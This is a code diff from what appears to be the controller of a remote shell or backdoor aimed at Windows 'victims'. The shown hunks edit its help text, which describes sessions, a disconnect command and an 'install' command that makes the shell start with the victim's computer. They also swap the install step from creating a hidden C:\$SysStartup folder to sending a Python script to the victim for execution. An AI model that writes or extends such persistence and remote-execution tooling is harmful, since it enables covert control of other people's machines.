@@ -33,7 +33,7 @@ class Commands:
         sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
         
         session Commands|:
-        disconnect: Disconnects from the pc(is needed if you dont want to reconnect later without the victim to restart the script)
+        disconnect: Disconnects from the selected shell
         misc:
             tree: Shows the entire dirrectorystructure of the 'C:\\' drive
             install: Makes the shell persistent(starts with the victims computer)
@@ -140,7 +140,8 @@ class Commands:
 
         # installs the shell persistently
         elif message == "install":
-            sendMessage("c n mkdir C:\\$SysStartup && cd C:\\ && attrib +h C:\\$SysStartup /d && mkdir C:\\$SysStartup\\temp")
+            with open("extraScripts/plain.py", "r") as file:
+                sendMessage(f"x{file.read()}")
 
         # is a small bat script which makes random number appear in a cmd screen
         elif message == "matrix":
@@ -178,7 +179,6 @@ class Commands:
 
 # gets the commands whenn session is sellected
 def sessionInput(conn, addr, name, decId):
-    decId = str(decId)
     """
     This is the menu when a session is sellected
     :param conn: class of the connected clinet
@@ -186,6 +186,7 @@ def sessionInput(conn, addr, name, decId):
     :param name: name of the session
     :param decId: the id of the session in the list
     """
+    decId = str(decId)
     try:
         command = input(f"command({name}): ")
         commandLst = command.split(" ")
